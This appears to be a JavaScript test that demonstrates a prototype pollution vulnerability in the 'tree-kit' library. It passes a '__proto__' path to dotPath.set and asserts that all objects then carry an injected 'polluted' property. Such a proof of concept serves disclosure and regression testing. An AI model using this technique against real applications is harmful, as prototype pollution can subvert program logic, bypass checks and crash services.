test("prototype pollution in tree-kit", () => {
  const { dotPath } = require('tree-kit')
  obj = {};
  expect({}.polluted).toBe(undefined);
  dotPath.set({}, ["__proto__", "polluted"], "yes") 
  expect({}.polluted).toBe("yes");
});
